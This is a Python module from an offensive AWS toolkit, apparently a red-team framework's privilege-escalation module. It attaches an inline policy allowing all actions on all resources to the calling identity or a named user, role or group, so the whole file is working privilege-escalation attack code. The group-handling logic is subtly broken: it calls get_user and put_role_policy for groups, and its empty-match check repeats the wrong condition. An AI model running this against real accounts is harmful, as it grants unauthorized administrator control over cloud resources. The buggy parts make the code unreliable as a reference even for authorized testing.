# Author: @vexance
# 


from json import dumps, loads
from datetime import datetime, timezone, timedelta

from stratustryke.core.module.aws import AWSModule
from stratustryke.lib.regex import AWS_IDENTITY_ARN_REGEX

class Module(AWSModule):
    ESC_TARGET = 'ESC_TARGET'
    POLICY_NAME = 'POLICY_NAME'
    DISARM_HOURS = 'DISARM_HOURS'
    POLICY_DOC = 'POLICY_DOC'

    def __init__(self, framework) -> None:
        super().__init__(framework)
        self._info = {
            'Authors': ['@vexance'],
            'Description': 'Attaches an inline adminstrtive policy to the target identity',
            'Details': 'Performs iam:PutUserPolicy, iamPutGroupPolicy, or iam:PutRolePolicy to attach an inline administrative policy to the target (defaults to the caller)',
            'References': ['']
        }

        self._options.add_string(Module.ESC_TARGET, 'Target IAM identity (name or arn) to attach the admin policy to [default: self]', False, None)
        self._options.add_string(Module.POLICY_NAME, 'Name for the inline policy to be created', False, 'stratustryke-admin-policy')
        self._options.add_integer(Module.DISARM_HOURS, 'Number of hours to allow the policy statement to evaluate for [default: 72]', False, 72)
        
        self._advanced.add_string(Module.POLICY_DOC, 'Used to supply the actual policy content instead of an adminstrative policy [S/F/P]', False, None)


    @property
    def search_name(self):
        return f'aws/iam/privesc/{self.name}'
    

    def generate_policy_document(self) -> str | None:
        '''Ingests supplied module args to determine the policy document contents'''

        manual_policy = self.get_opt_multiline(Module.POLICY_DOC)
        if manual_policy is not None:
            return self.load_manual_policy(manual_policy)

        disarm = self.get_opt(Module.DISARM_HOURS) or 72
        utc_now = datetime.now(timezone.utc)
        expiration = utc_now + timedelta(hours=disarm)

        exp_string = expiration.strftime('%Y-%m-%dT%H:%M:%SZ')
        self.print_status(f'Generated adminitrator policy will stop evaluating at {exp_string}')

        return dumps({
            'Version': '2012-10-17',
            'Statement': [
                {
                    'Sid': 'StratustrykeAttachInlineAdminPolicy',
                    'Effect': 'Allow',
                    'Action': '*',
                    'Resource': '*',
                    'Condition': {
                        'DateLessThan': {
                            'aws:CurrentTime': exp_string
                        }
                    }
                }
            ]
        })


    def load_manual_policy(self, content: list[str]) -> dict | None:
        '''Uses the user supplied POLICY_DOC arg to determine the inline policy contents'''
        try:
            doc_string = ''.join(content)
            doc_dict = loads(doc_string)

            self.print_status(f'Loaded manual policy document content')
            return dumps(doc_dict)
        except Exception as err:
            self.print_error(f'Could not load manually supplied policy document content')
            return None


    def derive_iam_target_identity(self, region) -> set:
        '''Attempt to determine which IAM resources match the given escalation target'''

        target = self.get_opt(Module.ESC_TARGET) or None
        if target is None:

            caller_arn = self.get_cred().arn
            split = caller_arn.split(':')

            # arn, aws, iam, '', ACCOUNT_ID, target-type/target-id
            caller_type = split[5].split('/')[0]
            if caller_type == 'assume-role': caller_type = 'role'
            caller_id = split[5].split('/')[1] # assumed-role will cut off the session name at index 2
            split[5] = f'{caller_type}/{caller_id}'
            target_arn = ':'.join(split[0:6])
            
            self.print_status(f'Interpretting caller {target_arn} as the self-escalation target')
            return {self.get_cred().arn}
        elif AWS_IDENTITY_ARN_REGEX.fullmatch(target): return {target}


        try:
            client = self.get_cred().session(region).client('iam')
        except Exception as err:
            self.print_error(f'Unable to instantiate iam client in derive_iam_target_identity()')
            return []
        
        ret = set()

        # Check for matching IAM user
        try:
            res = client.get_user(UserName=target)

            principal = res.get('User', {}).get('Arn', None)
            if principal is None: raise Exception(f'NoneType recevied parsing user arn from {res}')
            else: ret.add(principal)

        except Exception as err:
            if 'NoSuchEntityException' in str(err):
                self.print_warning(f'No IAM user exists matching user name {target}')
            else:
                self.print_error(f'Exception thrown during iam:GetUser - {err}')
        

        # Check for matching IAM role
        try:
            res = client.get_role(RoleName=target)

            principal = res.get('Role', {}).get('Arn', None)
            if principal is None: raise Exception(f'NoneType recevied parsing role arn from {res}')
            else: ret.add(principal)

        except Exception as err:
            if 'NoSuchEntityException' in str(err):
                self.print_warning(f'No IAM role exists matching role name {target}')
            else:
                self.print_error(f'Exception thrown during iam:GetRole - {err}')


        # Check for matching IAM group
        try:
            res = client.get_user(UserName=target)

            principal = res.get('Group', {}).get('Arn', None)
            if principal is None: raise Exception(f'NoneType recevied parsing user arn from {res}')
            else: ret.add(principal)

        except Exception as err:
            if 'NoSuchEntityException' in str(err):
                self.print_warning(f'No IAM user group exists matching group name {target}')
            else:
                self.print_error(f'Exception thrown during iam:GetGroup - {err}')
        
        return ret


    def run(self):
        
        policy_content = self.generate_policy_document()
        if policy_content is None:
            self.print_error(f'Generated policy content is NoneType')
            return None
        policy_name = self.get_opt(Module.POLICY_NAME)

        region = self.get_regions(multi_support=False)[0]
        iam_target = self.derive_iam_target_identity(region)

        if len(iam_target) > 1:
            self.print_warning('Found multiple IAM target matches, please specify the full target Arn')
            self.print_warning(f'Matching identities: {", ".join(iam_target)}')
            return None
        elif len(iam_target) > 1:
            self.print_warning('No IAM identity matches found for target, try a full Arn or check for typos...')
            return None
        
        target_arn = iam_target.pop()
        target_type = target_arn.split(':')[5].split('/')[0]
        target_name = target_arn.split(':')[5].split('/')[1]

        self.print_status(f'Attempting to add inline policy for {target_arn}')
        try:
            api = f'iam:Put{target_type.capitalize()}Policy'
            client = self.get_cred().session(region).client('iam')
            
            if target_type == 'user':
                res = client.put_user_policy(UserName=target_name, PolicyName=policy_name, PolicyDocument=policy_content)
            
            elif target_type == 'role':
                res = client.put_role_policy(RoleName=target_name, PolicyName=policy_name, PolicyDocument=policy_content)
            
            elif target_type == 'group':
                res = client.put_role_policy(RoleName=target_name, PolicyName=policy_name, PolicyDocument=policy_content)
                
            else:
                self.print_failure(f'Target type \'{target_type}\' is not in \'user, role, group\'')
                return None
            

            if res.get('ResponseMetadata', None) is not None:
                self.print_success(f'Response from {api} indicates successful escalation!')
            else:
                self.print_failure(f'Did not receive expected response metadata from {api}, something may have gone wrong...')

        except Exception as err:
            self.print_failure(f'Failed to attach policy to {target_arn} - {policy_content}')
            if self.verbose: self.print_error(str(err))

        return None